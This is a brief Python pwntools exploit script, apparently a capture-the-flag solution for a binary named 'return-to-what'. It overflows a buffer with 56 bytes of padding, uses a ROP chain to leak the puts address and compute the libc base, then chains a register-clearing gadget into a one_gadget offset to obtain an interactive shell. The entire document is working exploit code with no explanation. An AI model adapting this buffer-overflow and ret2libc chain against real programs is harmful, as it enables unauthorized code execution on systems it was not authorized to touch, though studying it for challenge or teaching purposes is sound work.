#!/usr/bin/env python3

from pwn import *

context.clear(arch='amd64')
elf = ELF('./return-to-what')


rop = ROP(elf)

rop.raw(rop.rdi.address)
rop.raw(elf.got.puts)
rop.raw(elf.plt.puts) 

rop.raw(elf.sym['main'])

r = process('./return-to-what')
r.clean()
r.writeline(b'A'*56 + rop.chain())

leak = r.readline()[:-1]
leak = unpack(leak, len(leak) * 8)
libc = leak - 0x765f0


rop = ROP(elf)

rop.raw(rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret']).address)
rop.raw(0) # pop r12
rop.raw(0) # pop r13
rop.raw(0) # pop r14
rop.raw(0) # pop r15

rop.raw(libc + 0xcbd1a)

r.clean()
r.writeline(b'A'*56 + rop.chain())


r.clean()
r.interactive()

